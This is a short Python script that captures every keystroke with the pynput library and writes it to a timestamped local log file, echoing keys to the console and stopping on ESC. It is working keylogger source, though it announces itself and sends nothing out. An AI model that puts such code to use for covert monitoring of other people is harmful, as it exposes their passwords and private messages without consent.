import os
import logging
from datetime import datetime
from pynput import keyboard

# === Setup ===
# Folder to store logs
LOG_DIR = "keylogs"

# Create log folder if it doesn't exist
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# Generate log file with timestamp
log_file = os.path.join(LOG_DIR, f"log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")
print(f"[INFO] Logging keystrokes to: {log_file}")

# Configure logging to write to the file
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s'
)

# === Event Handlers ===
def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key Pressed: {key}")
    print(f"[KEY] {key}")  # Optional: print to console for debugging

def on_release(key):
    if key == keyboard.Key.esc:
        print("[INFO] ESC pressed. Stopping keylogger.")
        return False

# === Start Listener ===
print("[INFO] Keylogger started. Type something... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("[INFO] Keylogger stopped. Log saved.")
